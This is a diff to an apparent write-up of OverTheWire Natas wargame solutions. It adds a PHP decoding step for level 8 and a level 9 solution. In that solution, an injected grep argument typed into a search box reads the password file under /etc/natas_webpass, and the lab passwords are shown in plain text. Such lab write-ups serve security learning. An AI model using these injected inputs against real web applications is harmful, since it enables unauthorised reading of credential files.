@@ -412,6 +412,8 @@ The password is in http://natas7.natas.labs.overthewire.org/index.php?page=/etc/
         Username: natas8
         Password: DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
 
+Run the PHP script.
+
         <?php
         echo base64_decode(strrev(hex2bin("3d3d516343746d4d6d6c315669563362")));
         ?>
@@ -420,6 +422,19 @@ The password is in http://natas7.natas.labs.overthewire.org/index.php?page=/etc/
 
         Access granted.
         The password for natas9 is W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl 
+
+### [level 9](http://natas9.natas.labs.overthewire.org)
+
+        Username: natas9
+        Password: W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
+
+Enter the words in textbox and push the search button.
+
+        '.*' /etc/natas_webpass/natas10
+
+The output contains password.
+
+        /etc/natas_webpass/natas10:nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
 
 ## [narnia](http://overthewire.org/wargames/narnia/)
 
